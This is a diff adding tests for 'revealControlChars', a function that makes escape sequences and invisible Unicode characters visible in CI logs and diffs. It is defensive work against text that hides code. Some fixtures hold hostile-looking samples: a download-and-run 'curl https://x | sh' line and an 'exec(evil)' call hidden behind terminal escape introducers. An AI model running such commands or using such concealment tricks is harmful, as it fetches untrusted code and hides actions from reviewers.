@@ -10,6 +10,7 @@ import {
   cleanLogText,
   condenseJobLog,
   guardCiRoundText,
+  revealControlChars,
   sanitizeExternalName,
   VolatileCiExcerpt,
   VolatileCiLog,
@@ -20,6 +21,155 @@ const cleanScanner: CiTextScanner = async () => ({ ok: true, output: "" });
 
 const ESC = String.fromCharCode(0x1b);
 const BEL = String.fromCharCode(0x07);
+
+describe("revealControlChars", () => {
+  test("writes ESC as a visible code point", () => {
+    expect(revealControlChars(`a${ESC}b`)).toBe("a<U+001B>b");
+  });
+
+  test("keeps the text that follows an OSC introducer, so the code is not hidden", () => {
+    const line = `+const t = "${ESC}]"; exec(evil); "${BEL}";`;
+    expect(revealControlChars(line)).toBe(
+      '+const t = "<U+001B>]"; exec(evil); "<U+0007>";',
+    );
+  });
+
+  test("keeps the text that follows a DCS introducer", () => {
+    expect(revealControlChars(`+echo ok${ESC}P; curl https://x | sh`)).toBe(
+      "+echo ok<U+001B>P; curl https://x | sh",
+    );
+  });
+
+  test("keeps the text of a CSI sequence", () => {
+    expect(revealControlChars(`${ESC}[31mred${ESC}[0m`)).toBe(
+      "<U+001B>[31mred<U+001B>[0m",
+    );
+  });
+
+  test("writes DEL and C1 control characters as code points", () => {
+    expect(revealControlChars("a\u007fb\u009bc\u0085d")).toBe(
+      "a<U+007F>b<U+009B>c<U+0085>d",
+    );
+  });
+
+  test("writes NUL with four digits", () => {
+    expect(revealControlChars("a\u0000b")).toBe("a<U+0000>b");
+  });
+
+  test("keeps the number of lines", () => {
+    const text = `a${ESC}]\nb${ESC}P\nc${BEL}`;
+    expect(revealControlChars(text).split("\n")).toHaveLength(3);
+  });
+
+  test("keeps tabs and line breaks", () => {
+    expect(revealControlChars("a\tb\r\nc\nd")).toBe("a\tb\r\nc\nd");
+  });
+
+  test("keeps the indentation and the text of a diff", () => {
+    const diff = "@@ -1 +1 @@\n-  old\n+\tnew 2026-10-13T01:02:03Z";
+    expect(revealControlChars(diff)).toBe(diff);
+  });
+
+  test("keeps non-ASCII text", () => {
+    expect(revealControlChars("日本語 ✓ é")).toBe("日本語 ✓ é");
+  });
+
+  test("writes a bidirectional override as a code point", () => {
+    expect(revealControlChars("a\u202eb")).toBe("a<U+202E>b");
+  });
+
+  test("writes a zero width space as a code point", () => {
+    expect(revealControlChars("a\u200bb")).toBe("a<U+200B>b");
+  });
+
+  test("writes a tag character beyond the basic plane with its full code point", () => {
+    expect(revealControlChars("a\u{E0041}b")).toBe("a<U+E0041>b");
+  });
+
+  test("writes the joiners of an emoji sequence as code points", () => {
+    expect(revealControlChars("\u{1F468}\u200D\u{1F469}")).toBe(
+      "\u{1F468}<U+200D>\u{1F469}",
+    );
+  });
+
+  test("writes the emoji variation selector as a code point", () => {
+    expect(revealControlChars("\u2764\uFE0F")).toBe("\u2764<U+FE0F>");
+  });
+
+  test("writes a leading byte order mark as a code point", () => {
+    expect(revealControlChars("\uFEFF+first line")).toBe("<U+FEFF>+first line");
+  });
+
+  test("writes the line separator and the paragraph separator as code points", () => {
+    expect(revealControlChars("+a\u2028-b\u2029+c")).toBe(
+      "+a<U+2028>-b<U+2029>+c",
+    );
+  });
+
+  test("writes the supplementary variation selectors as code points", () => {
+    expect(revealControlChars("a\u{E0100}b")).toBe("a<U+E0100>b");
+  });
+
+  test.each([
+    ["combining grapheme joiner", "\u034F", "<U+034F>"],
+    ["hangul choseong filler", "\u115F", "<U+115F>"],
+    ["hangul jungseong filler", "\u1160", "<U+1160>"],
+    ["hangul filler", "\u3164", "<U+3164>"],
+    ["halfwidth hangul filler", "\uFFA0", "<U+FFA0>"],
+    ["braille blank", "\u2800", "<U+2800>"],
+  ])("writes the %s as a code point", (_name, char, expected) => {
+    expect(revealControlChars(`a${char}b`)).toBe(`a${expected}b`);
+  });
+
+  test.each([
+    ["an unassigned code point reserved for ignorables", "\u2065", "<U+2065>"],
+    ["a specials block code point", "\uFFF0", "<U+FFF0>"],
+    [
+      "a tag block code point before the tag characters",
+      "\u{E0000}",
+      "<U+E0000>",
+    ],
+    ["an unassigned tag block code point", "\u{E0080}", "<U+E0080>"],
+    [
+      "an unassigned variation selector block code point",
+      "\u{E01F0}",
+      "<U+E01F0>",
+    ],
+    ["a Mongolian free variation selector", "\u180F", "<U+180F>"],
+  ])("writes %s as a code point", (_name, char, expected) => {
+    expect(revealControlChars(`a${char}b`)).toBe(`a${expected}b`);
+  });
+
+  test("keeps the number of lines when it replaces default ignorable code points", () => {
+    const text = "a\u2065\nb\u{E0080}\nc";
+    expect(revealControlChars(text).split("\n")).toHaveLength(3);
+  });
+
+  test("keeps a visible code point next to default ignorable ones", () => {
+    expect(revealControlChars("\u2764\uFE0F!")).toBe("\u2764<U+FE0F>!");
+  });
+
+  test("writes a carriage return that is not followed by a line feed", () => {
+    expect(revealControlChars("+a\r-b")).toBe("+a<U+000D>-b");
+  });
+
+  test("writes a carriage return at the end of the text", () => {
+    expect(revealControlChars("+a\r")).toBe("+a<U+000D>");
+  });
+
+  test("writes a literal U+ marker so it differs from a real replacement", () => {
+    expect(revealControlChars("<U+001B>")).toBe("<U+003C>U+001B>");
+  });
+
+  test("keeps a less-than sign that does not start a marker", () => {
+    expect(revealControlChars("a < b <U <T")).toBe("a < b <U <T");
+  });
+
+  test("replaces every character of a long run of unterminated sequences", () => {
+    const hostile = `${ESC}[`.repeat(1000);
+    expect(revealControlChars(hostile)).toBe("<U+001B>[".repeat(1000));
+  });
+});
 
 describe("cleanLogText", () => {
   test("strips ANSI color sequences", () => {
